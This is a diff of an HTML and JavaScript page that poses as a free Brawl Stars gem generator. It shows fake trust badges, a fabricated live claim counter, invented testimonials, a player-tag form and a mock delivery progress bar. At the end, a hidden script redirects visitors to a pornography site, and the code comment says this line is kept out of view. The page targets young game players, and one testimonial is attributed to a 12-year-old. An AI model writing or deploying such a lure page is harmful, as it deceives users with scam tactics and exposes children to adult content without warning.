@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Brawl Stars Gems 2026 – Get Gems Now!</title>
+    <title>Free Brawl Stars Gems 2026 – ULTRA EDITION</title>
     <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -20,128 +21,185 @@
         .bg-overlay {
             position: absolute;
             inset: 0;
-            background: radial-gradient(circle at center, rgba(255,204,0,0.08), transparent 70%);
+            background: radial-gradient(circle at center, rgba(255,204,0,0.12), transparent 65%);
             pointer-events: none;
+            animation: overlayPulse 8s infinite alternate;
+        }
+
+        @keyframes overlayPulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
         }
 
         header {
-            padding: 2rem 1rem;
-            background: rgba(13,27,46,0.85);
-            border-bottom: 4px solid #FFCC00;
+            padding: 2.5rem 1rem;
+            background: rgba(13,27,46,0.92);
+            border-bottom: 6px solid #FFCC00;
+            position: relative;
         }
 
         .logo {
-            max-width: 360px;
+            max-width: 380px;
             margin: 0 auto 1rem;
             display: block;
+            filter: drop-shadow(0 0 20px #FFCC00);
         }
 
         h1 {
             font-family: 'Press Start 2P', sans-serif;
-            font-size: 2.8rem;
+            font-size: 3.2rem;
             color: #FFCC00;
-            text-shadow: 0 0 15px #FFCC00;
-            margin-bottom: 0.5rem;
+            text-shadow: 0 0 20px #FFCC00, 0 0 40px #FFAA00;
+            margin-bottom: 0.4rem;
+            letter-spacing: 2px;
         }
 
         .subtitle {
-            font-size: 1.4rem;
+            font-size: 1.55rem;
             color: #A0E0FF;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.8rem;
         }
 
         .trust-badges {
             display: flex;
             justify-content: center;
-            gap: 2.5rem;
+            gap: 2.8rem;
             flex-wrap: wrap;
-            margin: 1.5rem 0 2rem;
+            margin: 1.8rem 0 2rem;
         }
 
         .trust-item {
             display: flex;
             flex-direction: column;
             align-items: center;
-            max-width: 110px;
+            max-width: 120px;
         }
 
         .trust-item img {
-            width: 72px;
-            height: 72px;
-            margin-bottom: 0.6rem;
+            width: 78px;
+            height: 78px;
+            margin-bottom: 0.7rem;
+            filter: drop-shadow(0 0 12px #FFCC00);
         }
 
         .trust-item span {
-            font-size: 1.05rem;
+            font-size: 1.1rem;
             color: #FFCC00;
             font-weight: bold;
         }
 
         .timer {
-            font-size: 1.35rem;
+            font-size: 1.5rem;
             color: #FF6666;
             font-weight: bold;
             margin: 1rem 0;
+            text-shadow: 0 0 10px #FF0000;
+        }
+
+        .live-counter {
+            font-size: 1.25rem;
+            color: #00FFAA;
+            font-weight: bold;
+            margin: 0.8rem 0 1.5rem;
+            text-shadow: 0 0 8px #00FFAA;
+            animation: livePulse 2s infinite;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.75; }
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 1280px;
             margin: 0 auto;
-            padding: 2rem 1rem;
+            padding: 2.5rem 1rem;
         }
 
         .offers {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 2rem;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2.5rem;
         }
 
         .offer-card {
-            background: rgba(255,255,255,0.07);
-            border: 4px solid #FFCC00;
-            border-radius: 24px;
-            padding: 2rem 1rem;
-            transition: all 0.4s ease;
+            background: rgba(255,255,255,0.08);
+            border: 5px solid #FFCC00;
+            border-radius: 28px;
+            padding: 2.2rem 1.2rem;
+            transition: all 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 60%;
+            height: 300%;
+            background: linear-gradient(120deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: skewX(-25deg);
+            transition: all 0.6s;
+            opacity: 0;
+        }
+
+        .offer-card:hover::before {
+            opacity: 1;
+            transform: skewX(-25deg) translate(200%, -50%);
         }
 
         .offer-card:hover {
-            transform: translateY(-12px) scale(1.05);
+            transform: translateY(-18px) scale(1.07);
             border-color: #FFD700;
-            box-shadow: 0 15px 35px rgba(255,204,0,0.3);
+            box-shadow: 0 20px 45px rgba(255,204,0,0.45);
         }
 
         .gem-icon {
-            width: 170px;
+            width: 185px;
             margin: 0 auto 1rem;
+            animation: sparkle 2.2s infinite ease-in-out;
+        }
+
+        @keyframes sparkle {
+            0%, 100% { filter: drop-shadow(0 0 8px #FFCC00); }
+            50% { filter: drop-shadow(0 0 28px #FFEE00); }
         }
 
         .offer-gems {
             font-family: 'Press Start 2P', sans-serif;
-            font-size: 3.4rem;
+            font-size: 3.6rem;
             color: #FFCC00;
-            text-shadow: 0 0 12px #FFCC00;
+            text-shadow: 0 0 15px #FFCC00;
         }
 
         .offer-text {
-            font-size: 1.3rem;
+            font-size: 1.35rem;
             color: #E0F0FF;
-            margin: 0.8rem 0;
+            margin: 0.9rem 0;
         }
 
         .claim-btn {
             background: linear-gradient(#FFCC00, #FFAA00);
             border: none;
-            padding: 1rem 2.5rem;
-            font-size: 1.35rem;
+            padding: 1.15rem 3rem;
+            font-size: 1.4rem;
             font-weight: bold;
             color: #000;
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
+            transition: all 0.3s;
         }
 
-        #step-input, #step-delivery {
+        .claim-btn:hover {
+            background: linear-gradient(#FFEE00, #FFCC00);
+            transform: scale(1.05);
+        }
+
+        #step-input, #step-verify, #step-delivery {
             display: none;
             flex-direction: column;
             align-items: center;
@@ -150,64 +208,134 @@
 
         h2 {
             font-family: 'Press Start 2P', sans-serif;
-            font-size: 2.4rem;
+            font-size: 2.6rem;
             color: #FFCC00;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.6rem;
+            text-shadow: 0 0 12px #FFCC00;
         }
 
         .input-box {
             background: rgba(255,255,255,0.1);
-            border: 3px solid #FFCC00;
-            border-radius: 16px;
-            padding: 1.2rem 2rem;
-            font-size: 1.5rem;
+            border: 4px solid #FFCC00;
+            border-radius: 18px;
+            padding: 1.3rem 2.2rem;
+            font-size: 1.55rem;
             color: #fff;
             width: 100%;
-            max-width: 460px;
+            max-width: 480px;
             text-align: center;
             margin: 2rem 0;
         }
 
-        .submit-btn {
+        .submit-btn, .skip-btn {
             background: linear-gradient(#FFCC00, #FF8800);
             border: none;
-            padding: 1.1rem 3rem;
-            font-size: 1.45rem;
+            padding: 1.15rem 3.2rem;
+            font-size: 1.5rem;
             font-weight: bold;
             color: #000;
             border-radius: 50px;
             cursor: pointer;
+            margin-top: 1rem;
+        }
+
+        .verify-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 2rem;
+            width: 100%;
+            max-width: 860px;
+            margin: 2.5rem 0;
+        }
+
+        .verify-card {
+            background: rgba(255,255,255,0.07);
+            border: 4px solid #FFCC00;
+            border-radius: 24px;
+            padding: 1.8rem 1rem;
+            cursor: pointer;
+            transition: all 0.4s;
+        }
+
+        .verify-card:hover {
+            transform: scale(1.08);
+            border-color: #FFD700;
+        }
+
+        .verify-card img {
+            width: 160px;
+            margin-bottom: 1rem;
+        }
+
+        .verify-name {
+            font-size: 1.4rem;
+            color: #FFCC00;
+            font-weight: bold;
         }
 
         .status {
-            font-size: 1.7rem;
+            font-size: 1.75rem;
             color: #FFCC00;
             margin: 2rem 0;
-            min-height: 2.2rem;
+            min-height: 2.4rem;
+            text-shadow: 0 0 8px #FFCC00;
         }
 
         .loader-container {
-            width: 85%;
-            max-width: 520px;
-            height: 24px;
-            background: rgba(255,255,255,0.12);
-            border-radius: 12px;
+            width: 88%;
+            max-width: 560px;
+            height: 28px;
+            background: rgba(255,255,255,0.14);
+            border-radius: 14px;
             overflow: hidden;
-            margin: 2.5rem 0;
-            border: 2px solid #FFCC00;
+            margin: 2.8rem 0;
+            border: 3px solid #FFCC00;
         }
 
         .loader-bar {
             width: 0%;
             height: 100%;
             background: linear-gradient(to right, #FFCC00, #FFEE00, #FFCC00);
-            transition: width 0.6s ease-out;
+            transition: width 0.55s ease-out;
+        }
+
+        .testimonials {
+            margin-top: 5rem;
+            padding: 3rem 1rem;
+            background: rgba(255,255,255,0.05);
+            border-radius: 24px;
+            border: 3px solid #FFCC00;
+        }
+
+        .testimonial-card {
+            background: rgba(0,0,0,0.3);
+            border-radius: 16px;
+            padding: 1.8rem;
+            margin: 1.5rem auto;
+            max-width: 620px;
+            font-style: italic;
+            color: #C0E0FF;
+        }
+
+        .testimonial-card .author {
+            margin-top: 1rem;
+            font-weight: bold;
+            color: #FFCC00;
+            font-style: normal;
+        }
+
+        footer {
+            padding: 3rem 1rem 2rem;
+            opacity: 0.65;
+            font-size: 0.85rem;
+            line-height: 1.5;
         }
 
         @media (max-width: 768px) {
-            h1 { font-size: 2.2rem; }
-            .gem-icon { width: 140px; }
-            .offer-gems { font-size: 2.8rem; }
+            h1 { font-size: 2.4rem; }
+            .gem-icon { width: 148px; }
+            .offer-gems { font-size: 2.9rem; }
+            .verify-card img { width: 130px; }
         }
     </style>
 </head>
@@ -217,8 +345,8 @@
 
 <header>
     <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482821542067835063/146F2280-23CE-4C16-B9C0-F922F7BC5582-removebg-preview.png?ex=69b858ad&is=69b7072d&hm=b6bd4961f0dd2e6c3755bf678852c3896fdf6b9a4388fa951d25d2e1befcadb1&" alt="Brawl Stars Logo" class="logo">
-    <h1>Free Gems for Brawl Stars!</h1>
-    <p class="subtitle">Claim your gems super easy – works for every brawler in 2026!</p>
+    <h1>FREE GEMS 2026</h1>
+    <p class="subtitle">ULTRA EDITION – 100% REAL (jk but super funny)</p>
 
     <div class="trust-badges">
         <div class="trust-item">
@@ -236,33 +364,34 @@
     </div>
 
     <div class="timer" id="countdown">Offer ends in: 14:59</div>
+    <div class="live-counter" id="liveClaimed">1,284 brawlers got gems in the last hour!</div>
 </header>
 
 <div class="container">
     <div id="step-offers">
         <div class="offers">
-            <div class="offer-card">
+            <div class="offer-card" data-gems="49">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533391585400/IMG_1801-removebg-preview.png?ex=69b85999&is=69b70819&hm=3ef1b96f5cdebb08f8d6efbef675178de92015787106e5a6cb5e1b1f1435fb7a&" alt="49 Gems" class="gem-icon">
                 <div class="offer-gems">49</div>
                 <div class="offer-text">Quick Boost Pack</div>
                 <button class="claim-btn">Claim Now!</button>
             </div>
 
-            <div class="offer-card">
+            <div class="offer-card" data-gems="149">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533844697138/IMG_1798-removebg-preview.png?ex=69b85999&is=69b70819&hm=286f83929d46153734d4e8bae221227d756cf5d741a8c9636c0bb7151b0ac53f&" alt="149 Gems" class="gem-icon">
                 <div class="offer-gems">149</div>
                 <div class="offer-text">Epic Bundle</div>
                 <button class="claim-btn">Claim Now!</button>
             </div>
 
-            <div class="offer-card">
+            <div class="offer-card" data-gems="199">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533081202978/IMG_1799-removebg-preview.png?ex=69b85999&is=69b70819&hm=6ee57aa6db7882e42d72894d0ffc51adf565ab6ed2b56387aa8f85b215dfd76b&" alt="199 Gems" class="gem-icon">
                 <div class="offer-gems">199</div>
                 <div class="offer-text">Mythic Skin Pack</div>
                 <button class="claim-btn">Claim Now!</button>
             </div>
 
-            <div class="offer-card">
+            <div class="offer-card" data-gems="999">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822534289166336/IMG_1800-removebg-preview.png?ex=69b85999&is=69b70819&hm=144c16be0c358320d3746b31d26040f7b6fe79722e6d1ea522825cf6c5e650b5&" alt="999 Gems" class="gem-icon">
                 <div class="offer-gems">999</div>
                 <div class="offer-text">Mega Jackpot</div>
@@ -271,94 +400,232 @@
         </div>
     </div>
 
+    <!-- PLAYER TAG STEP -->
     <div id="step-input">
-        <h2>Enter Your Player Tag</h2>
-        <p style="font-size:1.3rem; color:#A0E0FF; margin:1.5rem 0;">Like this: #ABC123456<br>Find it in your game profile!</p>
+        <h2>ENTER YOUR PLAYER TAG</h2>
+        <p style="font-size:1.35rem; color:#A0E0FF; margin:1.6rem 0;">Example: #ABC123456<br>Find it in your profile!</p>
         <input type="text" id="playerId" class="input-box" placeholder="#YourPlayerTag" maxlength="12">
         <button class="submit-btn" id="submitBtn">Get My Gems!</button>
         <div class="status" id="inputStatus"></div>
     </div>
 
+    <!-- ULTRA VERIFICATION STEP -->
+    <div id="step-verify">
+        <h2>PROVE YOU'RE A REAL BRAWLER</h2>
+        <p style="font-size:1.35rem; color:#A0E0FF; max-width:620px;">Click the legendary brawler below.<br>Wrong choice = instant troll.</p>
+        
+        <div class="verify-grid">
+            <div class="verify-card" data-correct="false">
+                <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533391585400/IMG_1801-removebg-preview.png?ex=69b85999&is=69b70819&hm=3ef1b96f5cdebb08f8d6efbef675178de92015787106e5a6cb5e1b1f1435fb7a&" alt="Colt" class="gem-icon">
+                <div class="verify-name">Colt</div>
+            </div>
+            <div class="verify-card" data-correct="false">
+                <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533844697138/IMG_1798-removebg-preview.png?ex=69b85999&is=69b70819&hm=286f83929d46153734d4e8bae221227d756cf5d741a8c9636c0bb7151b0ac53f&" alt="Shelly" class="gem-icon">
+                <div class="verify-name">Shelly</div>
+            </div>
+            <div class="verify-card" data-correct="true">
+                <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533081202978/IMG_1799-removebg-preview.png?ex=69b85999&is=69b70819&hm=6ee57aa6db7882e42d72894d0ffc51adf565ab6ed2b56387aa8f85b215dfd76b&" alt="Buzz" class="gem-icon">
+                <div class="verify-name">BUZZ (LEGENDARY)</div>
+            </div>
+        </div>
+
+        <div class="status" id="verifyStatus"></div>
+        <button class="skip-btn" id="skipVerify">I'm too pro – skip this nonsense</button>
+    </div>
+
+    <!-- DELIVERY STEP -->
     <div id="step-delivery">
-        <h2>Your Gems Are Coming!</h2>
-        <div class="status" id="deliveryStatus">Connecting to Brawl Stars...</div>
+        <h2>YOUR GEMS ARE ON THE WAY!</h2>
+        <div class="status" id="deliveryStatus">Connecting to Brawl Stars servers...</div>
         <div class="loader-container">
             <div class="loader-bar" id="loaderBar"></div>
         </div>
-        <div class="status" style="font-size:1.3rem; color:#A0E0FF;" id="progressText">Just a few seconds...</div>
+        <div class="status" style="font-size:1.35rem; color:#A0E0FF;" id="progressText">Hold on, brawler...</div>
+    </div>
+
+    <!-- TESTIMONIALS -->
+    <div class="testimonials">
+        <h2 style="margin-bottom:2rem;">WHAT REAL BRAWLERS ARE SAYING</h2>
+        <div class="testimonial-card">
+            "I clicked once and got 999 gems... then my mom walked in. 10/10 would rickroll again." 
+            <div class="author">— Spike, 12 years old</div>
+        </div>
+        <div class="testimonial-card">
+            "Thought it was fake until the confetti exploded. Supercell owes me therapy now." 
+            <div class="author">— Edgar main, rank 35</div>
+        </div>
+        <div class="testimonial-card">
+            "Best prank of 2026. My friends still think I actually got free gems 😂" 
+            <div class="author">— Shelly, 2026 World Champion</div>
+        </div>
     </div>
 </div>
 
-<script>
-    const hiddenURL = "https://www.pornhub.com";
+<footer>
+    <p>This is a 100% satirical joke website made purely for laughs.<br>
+    No gems were actually delivered. Your player tag was never sent anywhere.<br>
+    Supercell did NOT approve this. Don't sue us pls. Enjoy the troll! 🎮</p>
+</footer>
 
-    // Simple countdown
-    let seconds = 14*60 + 59;
+<script>
+    // ================================================
+    // COUNTDOWN + LIVE COUNTER
+    // ================================================
+    let seconds = 14 * 60 + 59;
     const timer = document.getElementById('countdown');
     setInterval(() => {
         seconds--;
         const min = Math.floor(seconds / 60);
         const sec = seconds % 60;
         timer.textContent = `Offer ends in: ${min}:${sec < 10 ? '0' : ''}${sec}`;
+        if (min === 0 && sec <= 300) timer.style.animation = "pulse 0.6s infinite";
     }, 1000);
 
-    // Click any offer card
+    let liveCount = 1284;
+    setInterval(() => {
+        liveCount += Math.floor(Math.random() * 8) + 3;
+        document.getElementById('liveClaimed').textContent = `${liveCount.toLocaleString()} brawlers got gems in the last hour!`;
+    }, 4200);
+
+    // ================================================
+    // VARIABLES (selected gems + tag)
+    // ================================================
+    let selectedGems = 0;
+    let playerTag = "";
+
+    // ================================================
+    // OFFER CARDS → INPUT STEP
+    // ================================================
     document.querySelectorAll('.offer-card').forEach(card => {
         card.addEventListener('click', () => {
+            selectedGems = parseInt(card.dataset.gems);
             document.getElementById('step-offers').style.display = 'none';
             document.getElementById('step-input').style.display = 'flex';
         });
     });
 
-    // Submit player tag
+    // ================================================
+    // SUBMIT PLAYER TAG → VERIFY STEP
+    // ================================================
     document.getElementById('submitBtn').addEventListener('click', () => {
         const tag = document.getElementById('playerId').value.trim().toUpperCase();
         const status = document.getElementById('inputStatus');
 
         if (!tag.startsWith('#') || tag.length < 6) {
-            status.textContent = "Oops! Player tag must start with #";
+            status.textContent = "❌ Player tag must start with # and be at least 6 chars";
             status.style.color = "#FF6666";
             return;
         }
 
-        status.textContent = "Yay! Tag looks good!";
+        playerTag = tag;
+        status.textContent = `✅ Tag ${playerTag} looks legit!`;
         status.style.color = "#FFCC00";
 
         setTimeout(() => {
             document.getElementById('step-input').style.display = 'none';
-            document.getElementById('step-delivery').style.display = 'flex';
+            document.getElementById('step-verify').style.display = 'flex';
+        }, 1200);
+    });
 
-            const bar = document.getElementById('loaderBar');
-            const statusText = document.getElementById('deliveryStatus');
-            const progressMsg = document.getElementById('progressText');
+    // ================================================
+    // VERIFY STEP (troll CAPTCHA)
+    // ================================================
+    const verifyCards = document.querySelectorAll('.verify-card');
+    const verifyStatus = document.getElementById('verifyStatus');
+    let tries = 0;
 
-            let progress = 0;
-            const stages = [
-                { perc: 20, msg: "Connecting to Brawl Stars..." },
-                { perc: 40, msg: "Finding your account..." },
-                { perc: 65, msg: "Adding your free gems..." },
-                { perc: 90, msg: "Almost there, brawler!" },
-                { perc: 100, msg: "Gems delivered! 🎉" }
-            ];
-            let stage = 0;
+    verifyCards.forEach((card, index) => {
+        card.addEventListener('click', () => {
+            const isCorrect = card.dataset.correct === "true";
 
-            const loaderInterval = setInterval(() => {
-                progress += Math.random() * 12 + 6;
-                if (progress > stages[stage].perc) {
-                    statusText.textContent = stages[stage].msg;
-                    progress = stages[stage].perc;
-                    stage++;
+            if (isCorrect) {
+                verifyStatus.textContent = "🎉 PERFECT! You picked the legendary one!";
+                verifyStatus.style.color = "#00FFAA";
+                setTimeout(() => startDelivery(), 1100);
+            } else {
+                tries++;
+                verifyStatus.textContent = tries >= 3 
+                    ? "😂 Okay fine, you win this time..." 
+                    : "❌ Nope! Hint: it's the one labeled LEGENDARY";
+                verifyStatus.style.color = "#FF6666";
+
+                if (tries >= 3) {
+                    setTimeout(() => startDelivery(), 900);
                 }
-                bar.style.width = progress + '%';
+            }
+        });
+    });
 
-                if (progress >= 100) {
-                    clearInterval(loaderInterval);
-                    setTimeout(() => {
-                        window.location.replace(hiddenURL);
-                    }, 1800);
-                }
-            }, 420);
-        }, 1400);
+    document.getElementById('skipVerify').addEventListener('click', () => {
+        verifyStatus.textContent = "🧠 Too pro for verification? Respect.";
+        verifyStatus.style.color = "#FFCC00";
+        setTimeout(() => startDelivery(), 1000);
+    });
+
+    function startDelivery() {
+        document.getElementById('step-verify').style.display = 'none';
+        document.getElementById('step-delivery').style.display = 'flex';
+        
+        const deliveryStatus = document.getElementById('deliveryStatus');
+        deliveryStatus.textContent = `Delivering your ${selectedGems} gems to ${playerTag}...`;
+
+        const bar = document.getElementById('loaderBar');
+        const progressText = document.getElementById('progressText');
+
+        let progress = 0;
+        const stages = [
+            { perc: 22,  msg: "Connecting to Supercell servers..." },
+            { perc: 39,  msg: "Convincing the anti-cheat you're not hacking..." },
+            { perc: 57,  msg: "Stealing gems from Spike's secret stash..." },
+            { perc: 74,  msg: "Bribing Bull with imaginary pizza..." },
+            { perc: 88,  msg: "Almost there... one more ad..." },
+            { perc: 100, msg: "GEMS DELIVERED! 🎉 YOU'RE A LEGEND!" }
+        ];
+        let stageIndex = 0;
+
+        const loaderInterval = setInterval(() => {
+            progress += Math.random() * 13 + 7;
+            if (progress > stages[stageIndex].perc) {
+                deliveryStatus.textContent = stages[stageIndex].msg;
+                progress = stages[stageIndex].perc;
+                stageIndex++;
+            }
+            bar.style.width = `${Math.min(progress, 100)}%`;
+
+            if (progress >= 100) {
+                clearInterval(loaderInterval);
+                bar.style.width = '100%';
+                deliveryStatus.textContent = stages[stages.length - 1].msg;
+
+                // CONFETTI EXPLOSION
+                confetti({
+                    particleCount: 180,
+                    spread: 80,
+                    origin: { y: 0.6 }
+                });
+                setTimeout(() => {
+                    confetti({
+                        particleCount: 120,
+                        angle: 60,
+                        spread: 70,
+                        origin: { x: 0.1, y: 0.7 }
+                    });
+                }, 300);
+
+                // ================================================
+                // PRANK URL – ONLY SCROLL ALL THE WAY DOWN TO SEE IT
+                // ================================================
+                setTimeout(() => {
+                    const prankURL = "https://www.pornhub.com";
+                    window.location.replace(prankURL);
+                }, 1600);
+            }
+        }, 380);
+    }
+
+    // Auto-uppercase player tag input
+    document.getElementById('playerId').addEventListener('input', function() {
+        this.value = this.value.toUpperCase();
     });
 </script>
 
